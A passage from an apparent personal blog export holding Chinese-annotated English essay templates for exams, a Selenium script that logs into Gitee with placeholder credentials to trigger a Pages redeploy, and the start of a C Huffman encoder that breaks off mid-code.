<h2 id="主体段中文思路小结"><a href="#主体段中文思路小结" class="headerlink" title="主体段中文思路小结"></a>主体段中文思路小结</h2><blockquote>
<p><strong>我认为</strong>关注别人的建议<strong>很重要的原因如下所述</strong>。<strong>也许第一个主要的原因是</strong>接受别人的意见的人<strong>会</strong>获得充足的知识并且更了解自己。<strong>最典型的一个例子是</strong>Jackson Lee<strong>的故事</strong>，<strong>他</strong>是中国一位有名的年轻明星。<strong>具体来说</strong>，<strong>正是</strong>其他成员的建议帮助他形成最匹配自己特长的风格。<strong>此外，众所周知</strong>倾听别人的观点对职业成功有好处。<strong>很多的教育研究者同意</strong>大多数名人的职业成功<strong>能归因于对</strong>别人建议的<strong>关注</strong>，<strong>例如</strong>朋友，家人和同事</p>
</blockquote>
<h2 id="译文"><a href="#译文" class="headerlink" title="译文"></a>译文</h2><blockquote>
<p>The reasons why I think paying attention to others’ opinions is of utmost importance are as follows. Perhaps the primary reason is that people who accept others’ advice will acquire sufficient knowledge and get a clear understanding of themselves. A typical example is the story of Jackson Lee, who is a young star in China. Specifically speaking, it is other group members’ suggestions that help him to form the style which most suits his talent. In addition, it would be universally acknowledged that listening to others’ viewpoints is beneficial for career success. Many educational researchers agree that most famous people’s career success can be generally attributed to the focus on opinions from other people. such as close friends, family and colleagues.</p>
</blockquote>
<h2 id="主体段语句模板"><a href="#主体段语句模板" class="headerlink" title="主体段语句模板"></a>主体段语句模板</h2><blockquote>
<p><strong>一、The reasons why I think …… is of utmost importance are as follows</strong></p>
<p><strong>二、Perhaps the primary reason is that people who ……will……</strong></p>
<p><strong>三、A typical example is the story of……，who……</strong></p>
<p><strong>四、 Specifically speaking, it is……that……</strong></p>
<p><strong>五、In addition, it would be universally acknowledged that…… is beneficial for ……</strong></p>
<p><strong>六、Many educations researcher agree that……can be generally attributed to the focus on……. such as ……, …… and …….</strong></p>
</blockquote>
<h1 id="“常规类”议论文的基本框架"><a href="#“常规类”议论文的基本框架" class="headerlink" title="“常规类”议论文的基本框架"></a>“常规类”议论文的基本框架</h1><blockquote>
<p>开头段P1</p>
<p>主体段P2</p>
<p>结尾段P3</p>
</blockquote>
<h2 id="P1开头段"><a href="#P1开头段" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>There has been a heated discussion about experiences of attending different courses in college among university student.</strong></p>
<p><strong>from my point of view, <em>taking part in</em> English literature courses has given me impressive experience.</strong></p>
</blockquote>
<h2 id="P1句型"><a href="#P1句型" class="headerlink" title="P1句型"></a>P1句型</h2><blockquote>
<p><strong>There has been a heated discussion about  XX among university student.</strong></p>
<p><strong>from my point of view, xx</strong></p>
</blockquote>
<h2 id="主体段总起引出原因句型"><a href="#主体段总起引出原因句型" class="headerlink" title="主体段总起引出原因句型"></a>主体段总起引出原因句型</h2><blockquote>
<p><strong>一、After investigating the situation in detail, the reasons for my well-considered decision are as follows.（原分）</strong></p>
<p><strong>二、The reasons why I recommend/think xx is of utmost impression/importance are as follows.(保分)</strong></p>
<p><strong>三、The reasons for my unforgettable memories of xx are as follows.(冲分)</strong></p>
</blockquote>
<h2 id="P2主体段"><a href="#P2主体段" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p>一、The reasons for a truly unforgettable memorizes of English literature courses are as follows.</p>
<p>二、After investigating the situation in detail, the reasons for my well-considered decision are as follows</p>
</blockquote>
<blockquote>
<p>一、After investigating  the situation in detail, the reasons for a truly unforgettable impression of courses in English literature are as follows. <strong>Firstly</strong>, <strong>this course broadened my horizons</strong>. <strong>I encountered a wider array of absorbing works of fiction, poetry, and nonfiction from around the world and throughout history.</strong> <strong>Secondly</strong>, <strong>analyzing the works of the greatest minds and imaginations  taught me to think critically about complex topics from different perspectives</strong>. For example, The study  of George Orwell’s 1984 shed new light on the importance of freedom. <strong>Lastly, the courses enabled me to develop transferable skills, which are crucial for employers. For example, in the group project, I learned how to organize information, write reports and give presentation in a collaborative way.</strong></p>
<p>二、After investigating  the situation in detail, the reasons for a truly unforgettable impression of courses in English literature are as follows.  Perhaps the primary reason is that I read many works will broaden my horizons.  <strong>I encountered a wider array of absorbing works of fiction, poetry, and nonfiction from around the world and throughout history.</strong> The second reason is that <strong>analyzing the works of the greatest minds and imaginations  taught me to think critically about complex topics from different perspectives</strong>. For example, the study  of George Orwell’s 1984 shed new light on the importance of freedom. Lastly, the courses enabled me to develop transferable skills, which are crucial for employers. For example, in the group project, I learned how to organize information, write reports and give presentation in a collaborative way.</p>
</blockquote>
<h2 id="P2句型提取"><a href="#P2句型提取" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p>一、After investigating the situation in detail, the reason for my well-considered decision are as follows.</p>
<p>二、Perhaps the primary reason is that xx, </p>
<p>三、 the second reason is that xx   . for example</p>
<p>四、 Lastly , the courses enabled me to develop transferable skills, which are crucial for employers. For example, in the group project, I learned how to organize information, write reports and give presentation in a collaborative way.</p>
</blockquote>
<h2 id="P3结尾段"><a href="#P3结尾段" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p>In view of the reasons mentioned above, I intend to choose English literature courses. Besides, I highly suggest that everyone balance the pros and cons of each option to make a sound choice.</p>
<p>In view of the valuable knowledge and improved skills acquire in course, I would highly suggest choosing English literature courses in the university.</p>
</blockquote>
<h2 id="P3句型提取"><a href="#P3句型提取" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p>In view of the reasons mentioned above, I intend to xx . Besides, I highly suggest that everyone balance the pros and cons of each option to make a sound choice.</p>
<p>In view of xx  and xx acquire in course, I would highly suggest choosing xx in the university.</p>
</blockquote>
<h1 id="一般议论文-论说文写作框架1"><a href="#一般议论文-论说文写作框架1" class="headerlink" title="一般议论文/论说文写作框架1"></a>一般议论文/论说文写作框架1</h1><h2 id="P1开头段-1"><a href="#P1开头段-1" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>There has been a heated discussion about  xx among xx . From my point of view, xx</strong></p>
</blockquote>
<h2 id="P2主体段-1"><a href="#P2主体段-1" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>After investigating the situation in detail, The reasons for (my well-considered decision/ xx) are as follows.</strong></p>
<p><strong>Perhaps the primary reason is that xx will. for example xx.</strong></p>
<p><strong>The second reason is that xx. F</strong>or example  xx.</p>
<p>Lastly, xx It’s no secret that xx.</p>
</blockquote>
<h2 id="P3结尾段-1"><a href="#P3结尾段-1" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>in view of the reasons mentioned above, I intend to xx . Besides, I highly suggest that everyone balance the pros and cons of each option to make a sound choice</strong></p>
</blockquote>
<h1 id="一般议论文-论说文写作框架2"><a href="#一般议论文-论说文写作框架2" class="headerlink" title="一般议论文/论说文写作框架2"></a>一般议论文/论说文写作框架2</h1><h2 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">题目：How to best handle the relationship between doctors <span class="keyword">and</span> patients</span><br></pre></td></tr></table></figure>

<h2 id="P1开头段-2"><a href="#P1开头段-2" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>while  society is developing at a rapid rate. There has been an increase in the number of people who are facing problems with</strong> doctor-patient relationship. <strong>In view of this situation, many researchers suggest that</strong> a good doctor-patient relationship <strong>will</strong> improve health outcomes <strong>and it is high time for individuals to seek effective methods to</strong> nurture and maintain a strong/healthy relationship between doctors and patients.</p>
</blockquote>
<h2 id="P1句型提取"><a href="#P1句型提取" class="headerlink" title="P1句型提取"></a>P1句型提取</h2><blockquote>
<p>*<em>while  society is developing at a rapid rate. There has been an increase in the number of people who are facing problems with xx *</em></p>
<p><strong>In view of this situation, many researchers suggest that</strong> <strong>xx</strong> <strong>will</strong> <strong>xx</strong> <strong>and it is high time for individuals to seek effective methods to</strong> <strong>xx</strong></p>
</blockquote>
<h2 id="P2主体段-2"><a href="#P2主体段-2" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>Then, how to</strong> foster a good doctor-patient relationship ?<br><strong>Perhaps the first step is that</strong> doctors <strong>need to</strong> act as an active listener to cultivate good communication. <strong>Specifically speaking</strong>, physicians are supposed to take time to listen to their patients to understand both their symptoms and emotional state. <strong>Otherwise</strong>, <strong>the great opportunity for</strong> establishing a trusting and meaningful relationship <strong>will slip away.</strong> <strong>Another necessary step is to build mutual respect relationship between doctors and patients</strong>, <strong>which can lay a solid foundation for</strong> a strong and positive doctor-patient relationship. <strong>by combining aforementioned methods, we can achieve the aim/goal.</strong></p>
</blockquote>
<h2 id="P2句型提取-1"><a href="#P2句型提取-1" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p><strong>Then, how to xx ?</strong></p>
<p><strong>Perhaps the first step is that individuals(个人的)/doctors(医生)/patients(病人) need to xx .</strong></p>
<p><strong>Specifically speaking, xx.</strong></p>
<p><strong>Otherwise, the great opportunity for xx will slip away.</strong></p>
<p> <strong>Another necessary step is to build mutual respect relationship between doctors and patients</strong>, <strong>which can lay a solid foundation for</strong> <strong>XX</strong>.</p>
<p><strong>by combining aforementioned methods, we can achieve the aim/goal.</strong></p>
</blockquote>
<h2 id="P3结尾段-2"><a href="#P3结尾段-2" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>In conclusion, there many well-documented benefits of</strong> establishing a good relationship between doctors <strong>and patients and it is</strong> <strong>worth investing the effort to</strong> best handle the relationship.</p>
</blockquote>
<h2 id="P3句型提取-1"><a href="#P3句型提取-1" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p><strong>In conclusion, there many well-documented benefits of xx and patients and it is worth investing the effort to xx.</strong></p>
</blockquote>
<h1 id="图画作为-现象影响类框架"><a href="#图画作为-现象影响类框架" class="headerlink" title="图画作为+现象影响类框架"></a>图画作为+现象影响类框架</h1><h2 id="真题-1"><a href="#真题-1" class="headerlink" title="真题"></a>真题</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210604141225743.png" alt="image-20210604141225743"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">You should start your essay with a brief description of the picture <span class="keyword">and</span> then comment on <span class="keyword">this</span> kind of modern life.</span><br></pre></td></tr></table></figure>

<h2 id="P1开头段-3"><a href="#P1开头段-3" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>This simple but enlightening cartoon is a lively depiction of</strong> a common lifestyle in the modern world. <strong>Specifically speaking, the person in the picture is</strong> always sitting in front of computers all most the whole day. Even when he or she is sleeping, the scene of playing computers emerges in the dreams. <strong>The scene in this drawing symbolically reveals that computers can have a harmful influence on people’s lives.</strong></p>
</blockquote>
<h2 id="P1句型提取-1"><a href="#P1句型提取-1" class="headerlink" title="P1句型提取"></a>P1句型提取</h2><blockquote>
<p><strong>This simple but enlightening cartoon is a lively depiction of xx.</strong> </p>
<p><strong>Specifically speaking,  人物 in the picture is/are 做什么.</strong></p>
<p><strong>The scene in this drawing symbolically reveals that computers can have a harmful influence on xx</strong></p>
</blockquote>
<h2 id="P2主体段-3"><a href="#P2主体段-3" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>No one could deny the fact that there has been an increase in the number of people who</strong> overuse computers in the everyday life, <strong>which can negatively affect</strong> individuals’ physical and emotional health. <strong>For example, if people</strong> spend a lot of time sitting at computer desks, they may suffer from physical symptoms, such as headaches, blurred eyes and upper back pain. <strong>In addition, it would be universally acknowledged that</strong> spending too much time playing computer games <strong>is not beneficial for</strong> mental health. <strong>Many psychological researchers found that there is a link between</strong> computer addiction <strong>and</strong> emotional health issues, such as depression and anxiety. <strong>That is to say,</strong> people with computer addiction are more likely to feel anxious when they cannot surf online or play computer games.</p>
</blockquote>
<h2 id="P2句型提取-2"><a href="#P2句型提取-2" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p><strong>No one could deny the fact that there has been an increase in the number of people who  xx , which can negatively affect</strong> </p>
<p><strong>For example, if people xx, they may suffer xx, such as  xx</strong></p>
<p><strong>In addition, it would be universally acknowledged that xx  is not beneficial for  xx</strong></p>
<p><strong>Many psychological researchers found that there is a link between  现象   and  问题</strong></p>
<p><strong>That is to say, xx</strong></p>
</blockquote>
<h2 id="P3结尾段-3"><a href="#P3结尾段-3" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>In conclusion, it is worth investing the effort to</strong> counteract the negative effects mentioned above. <strong>In my opinion</strong>, setting limits of/on screen time and taking frequent breaks <strong>should be the first step</strong>.</p>
</blockquote>
<h2 id="P3句型提取-2"><a href="#P3句型提取-2" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p><strong>In conclusion, it is worth investing the effort to xx.</strong></p>
<p><strong>In my opinion, xx should be the first step.</strong></p>
</blockquote>
<h1 id="现象（影响、问题）框架1"><a href="#现象（影响、问题）框架1" class="headerlink" title="现象（影响、问题）框架1"></a>现象（影响、问题）框架1</h1><h2 id="真题-2"><a href="#真题-2" class="headerlink" title="真题"></a>真题</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210610225440345.png" alt=""></p>
<h2 id="P1开头段-4"><a href="#P1开头段-4" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>While the society is developing at a rapid rate, there has been an increase in the number of people/individuals who are more inclined to</strong> use translation applications. <strong>From my point of view</strong>, <strong>reasons behind this phenomenon are various and this trend might generate undesirable outcomes in the long run</strong>.</p>
</blockquote>
<h2 id="P1句型提取-2"><a href="#P1句型提取-2" class="headerlink" title="P1句型提取"></a>P1句型提取</h2><blockquote>
<p><strong>一、引出现象</strong></p>
<p><strong>While the society is developing at a rapid rate, there has been an increase in the number of people/individuals who are more inclined to</strong> do sth. </p>
<p><strong>二、表达不好的看法，自己的</strong></p>
<p><strong>From my point of view</strong>, <strong>reasons behind this phenomenon are various and this trend might generate undesirable outcomes in the long run</strong>.</p>
</blockquote>
<h2 id="P2主体段-4"><a href="#P2主体段-4" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>版</strong>本一</p>
<p><strong>1.0 谈好处</strong></p>
<p><strong>On the one hand, the greatest advantage of</strong> using electronic translation applications <strong>is that it offers great convenience.</strong> <strong>More specifically,</strong> translation applications are usually user-friendly and can be easily downloaded in the applications store. <strong>For example</strong>, language learners can just type/input the sentence they don’t understand and check its meaning at any time.</p>
<p><strong>2.0 谈坏处</strong></p>
<p><strong>On the other hand, I am of the opinion that</strong> overusing electronic translation applications <strong>can cause more problems.</strong> <strong>For one thing</strong>, if language learners depend heavily on translation applications, they will gradually be detrimental to independent thinking ability. <strong>In addition</strong>, machine translations are inaccurate and grammatical when the text is long and complicated. <strong>this is because there is often a link between</strong> accurate meaning of language <strong>and</strong> the context.</p>
<p><strong>版本二</strong></p>
<p><strong>1.0 现象产生的原因（谈两个原因）</strong></p>
<p><strong>The main reason why translation applications have become immensely popular is that</strong> translation applications <strong>are more convenient than traditional dictionaries in this fast-paced era</strong>. <strong>Another equally important reason is that</strong> language learner are more user-friendly now <strong>because of</strong> technological advancements.</p>
<p><strong>1.1 第二个写法（谈一个现象，论述）</strong></p>
<p><strong>Multiple reason can account for the phenomenon mentioned above. the primary reason is that</strong> translation applications are <strong>too convenient</strong>. <strong>This is due to the fact that</strong> translation applications are user-friendly and can be easily downloaded in the applications store. <strong>For example</strong>, language learner can just type the sentence they don’t understand in the translation applications and check its meaning at any time when text is difficult to read.</p>
<p><strong>2.0 谈坏处</strong></p>
<p><strong>However, there are problems accompanying with the benefits mentioned in the last paragraph. For one thing, it would be universally acknowledged that</strong> if language learners depend heavily on translation applications, <strong>they will gradually be detrimental to independent thinking ability</strong>. <strong>For another one, no one can deny/doubt the fact that</strong> machine translation are ungrammatical and inaccurate when the text is long and complicated. This is because there is often a link between the accurate meaning of language and the context</p>
</blockquote>
<h2 id="P2句型提取-3"><a href="#P2句型提取-3" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p><strong>版本一</strong></p>
<p><strong>1.0句型</strong></p>
<p><strong>On the one hand, the greatest advantage of xx is that it offers great convenience. More specifically, xx. For example xx.</strong></p>
<p><strong>2.0句型</strong></p>
<p><strong>On the other hand, I am of the opinion that xx can cause more problems. For one thing</strong>, <strong>if</strong> <strong>individuals</strong> xx. <strong>In addition xx.</strong></p>
<p><strong>this is because there is often a link between</strong> xx <strong>and</strong> the xx.</p>
<p><strong>版本二</strong></p>
<p><strong>1.0句型</strong></p>
<p><strong>The main reason why translation applications have become immensely popular is that xx are more convenient than traditional dictionaries in this fast-paced era. Another equally important reason is that xx because of technological advancements.</strong></p>
<p><strong>1.1句型</strong></p>
<p><strong>Multiple reason can account for the phenomenon mentioned above. the primary reason is that</strong> xx <strong>too convenient</strong>. <strong>This is due to the fact that</strong> xx <strong>For example</strong>, xx.</p>
<p><strong>2.0句型</strong></p>
<p><strong>However, there are problems accompanying with the benefits mentioned in the last paragraph. For one thing, it would be universally acknowledged that</strong> <strong>if</strong> xx, <strong>they will gradually be detrimental to independent thinking ability</strong>. <strong>For another one, no one can deny/doubt the fact that</strong> xx. <strong>This is because there is often a link between</strong> xx the xx.</p>
</blockquote>
<h2 id="P3结尾段-4"><a href="#P3结尾段-4" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>In conclusion, using translation applications are more drawbacks than benefits and I highly suggest that language learner should use translation applications reasonably.</strong></p>
</blockquote>
<h2 id="P3句型提取-3"><a href="#P3句型提取-3" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p><strong>In conclusion,  xx are more drawbacks than benefits and I highly suggest that xx reasonably.</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>English</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>议论文万能模板</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitee pages自动部署</title>
    <url>/2021/05/27/Gitee%20pages%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h1><h2 id="1-1-安装环境"><a href="#1-1-安装环境" class="headerlink" title="1.1 安装环境"></a>1.1 安装环境</h2><blockquote>
<p>1、安装python3<br>2、打开命令行安装selenium</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure></div>

<h1 id="二、python代码"><a href="#二、python代码" class="headerlink" title="二、python代码"></a>二、python代码</h1><h2 id="2-1-源码"><a href="#2-1-源码" class="headerlink" title="2.1 源码"></a>2.1 源码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.alert <span class="keyword">import</span> Alert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟浏览器打开到gitee登录界面</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">'https://gitee.com/login'</span>)</span><br><span class="line"><span class="comment"># 将窗口最大化</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入账号--通过html的id属性定位输入位置--改为你的账号</span></span><br><span class="line">user_login = driver.find_element_by_id(<span class="string">'user_login'</span>)</span><br><span class="line">user_login.send_keys(<span class="string">"此处改为你的账号"</span>)</span><br><span class="line"><span class="comment"># 输入密码--通过html的id属性定位输入位置--改为你的密码</span></span><br><span class="line">driver.find_element_by_id(<span class="string">'user_password'</span>).send_keys(<span class="string">"此处改为你的密码"</span>)</span><br><span class="line"><span class="comment"># 点击登录按钮--通过xpath确定点击位置</span></span><br><span class="line">driver.find_element_by_xpath(</span><br><span class="line">    <span class="string">'/html/body/div[2]/div[2]/div[1]/div/div[2]/div/form[1]/div[2]/div/div/div[4]/input'</span>).click()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到gitee pages界面--改为you_gitee_id</span></span><br><span class="line">driver.get(<span class="string">'https://gitee.com/此处改为you_gitee_id/此处改为you_gitee_id/pages'</span>)</span><br><span class="line"><span class="comment"># 点击更新按钮--通过xpath确定点击位置</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">'/html/body/div[3]/div[2]/div/div[2]/div[1]/form/div[7]'</span>).click()</span><br><span class="line"><span class="comment"># 确认更新提示框--这个函数的作用是确认提示框</span></span><br><span class="line">Alert(driver).accept()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待5秒更新</span></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个print其实没事什么用,如果真的要测试脚本是否运行成功，可以用try来抛出异常</span></span><br><span class="line">print(<span class="string">"成功"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本运行成功,退出浏览器</span></span><br><span class="line">driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写上更新日志</span></span><br><span class="line"><span class="comment"># 我这里是写在D盘，可以改为自己喜欢的目录</span></span><br><span class="line">fp = open(<span class="string">"D:\log.txt"</span>, <span class="string">"a+"</span>)</span><br><span class="line">now_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">fp.write(<span class="string">"auto update time:&#123;0&#125;\n"</span>.format(now_time))</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure></div>

<h2 id="2-2-注意事项"><a href="#2-2-注意事项" class="headerlink" title="2.2 注意事项"></a>2.2 注意事项</h2><ul>
<li><blockquote>
<p>xpath可以通过在chrom的网页里面按F12来查看</p>
</blockquote>
</li>
<li><p>演示过程</p>
<p><img src="https://i.loli.net/2021/05/27/OnUEfVm7xrcjzLy.png" alt="image-20210527091833274">)<img src="https://i.loli.net/2021/05/27/iTGhdgF7QjZ48LC.png" alt="image-20210527092020370"></p>
</li>
<li><blockquote>
<p>需要将chromeDrive可执行驱动丢到你python根目录（跟python.exe放在一起）</p>
</blockquote>
</li>
</ul>
<p><strong>下载地址</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chromedriver.storage.googleapis.com&#x2F;index.html</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/27/E1QUKsRJdSylik7.png" alt="image-20210527092403780"></p>
]]></content>
      <categories>
        <category>hexo博客搭建</category>
      </categories>
      <tags>
        <tag>Gitee自动部署</tag>
        <tag>python脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>[C]哈夫曼编码器和译码器（C语言）</title>
    <url>/2021/05/25/%5BC%5D%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81%E5%99%A8%E5%92%8C%E8%AF%91%E7%A0%81%E5%99%A8%EF%BC%88C%E8%AF%AD%E8%A8%80%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="哈夫曼编码器和译码器-完整代码"><a href="#哈夫曼编码器和译码器-完整代码" class="headerlink" title="哈夫曼编码器和译码器(完整代码)"></a>哈夫曼编码器和译码器(完整代码)</h1><p><img src="https://i.loli.net/2021/05/25/8qyZe3hKCnFUT7H.png" alt="image-20210525192524119"></p>
<p><img src="https://i.loli.net/2021/05/25/VZ3UzDhgic2XEvL.png" alt="image-20210525204021071"></p>
<h1 id="执行结果和代码奉上"><a href="#执行结果和代码奉上" class="headerlink" title="执行结果和代码奉上"></a>执行结果和代码奉上</h1><p><img src="https://i.loli.net/2021/05/25/ZjsMtCQTE79iHcX.png" alt="image-20210525204133220"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 30 <span class="comment">//叶子节点最大值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 2*N-1 <span class="comment">//所有结点最大值</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> data;</span><br><span class="line">	<span class="keyword">int</span> weight;</span><br><span class="line">	<span class="keyword">int</span> parent;</span><br><span class="line">	<span class="keyword">int</span> Lchild;</span><br><span class="line">	<span class="keyword">int</span> Rchild;</span><br><span class="line">	<span class="keyword">int</span> flag;</span><br><span class="line">&#125;HTNode,HuffmanTree[M+<span class="number">1</span>]; <span class="comment">//0号单元不用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化哈夫曼树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitHuffmanTree</span><span class="params">(HuffmanTree ht,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"#提示——（输入示例a b c d e）请输入对应叶子节点的字符：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="comment">//初始化叶子节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		ht[i].data=<span class="string">'\0'</span>;</span><br><span class="line">		ht[i].Lchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].Rchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].weight=<span class="number">0</span>;</span><br><span class="line">		ht[i].parent=<span class="number">0</span>;</span><br><span class="line">		ht[i].flag=<span class="number">0</span>;</span><br><span class="line">		getchar(); <span class="comment">//消除空格 读取下一次输入的空格并且消除</span></span><br><span class="line">		ht[i].data=getchar();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"#提示——（输入示例12 40 15 8 25）请输入对应叶子节点的权重：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) <span class="comment">//初始化叶子节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;ht[i].weight);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> m=<span class="number">2</span>*n<span class="number">-1</span>;<span class="comment">//结点总数</span></span><br><span class="line">	<span class="keyword">for</span>(i=n+<span class="number">1</span>;i&lt;=m;i++)<span class="comment">//初始化非叶子节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		ht[i].Lchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].Rchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].weight=<span class="number">0</span>;</span><br><span class="line">		ht[i].parent=<span class="number">0</span>;</span><br><span class="line">		ht[i].flag=<span class="number">0</span>; <span class="comment">//判断是否被删除</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择最小权值节点下标</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(HuffmanTree ht,<span class="keyword">int</span> n)</span><span class="comment">//选择最小权值的结点下标</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,temp,<span class="built_in">min</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)<span class="comment">//设置初始下标和权值</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ht[i].flag==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=ht[i].weight;<span class="comment">//初始权值</span></span><br><span class="line">			<span class="built_in">min</span>=i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ht[i].flag==<span class="number">0</span>&amp;&amp;temp&gt;ht[i].weight)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=ht[i].weight;</span><br><span class="line">			<span class="built_in">min</span>=i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ht[<span class="built_in">min</span>].flag=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span 